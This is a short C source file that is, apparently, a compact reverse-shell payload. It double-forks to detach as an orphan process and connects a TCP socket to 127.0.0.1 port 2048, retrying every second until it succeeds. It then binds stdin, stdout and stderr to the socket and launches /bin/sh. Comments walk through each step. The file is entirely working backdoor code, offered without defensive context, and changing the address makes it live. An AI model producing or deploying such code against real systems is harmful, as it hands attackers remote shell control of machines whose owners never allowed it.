int main(void)
{
	// spawn child
	if (fork())
		return 0;

	// spawn orphan
	if (fork())
		return 0;

	// create socket
	// AF_INET, SOCK_STREAM
	int s = socket(2, 1, 0);

	// keep retrying connection until success
	// AF_INET, PORT: 2048, ADDR: 127.0.0.1
	while (connect(s, (char []){2,0, 8,0, 127,0,0,1}, 16))
		sleep(1);

	// duplicate stdin, stdout, stderr
	dup2(s, 0);
	dup2(s, 1);
	dup2(s, 2);
	
	// spawn shell
	execv("/bin/sh", 0);
}
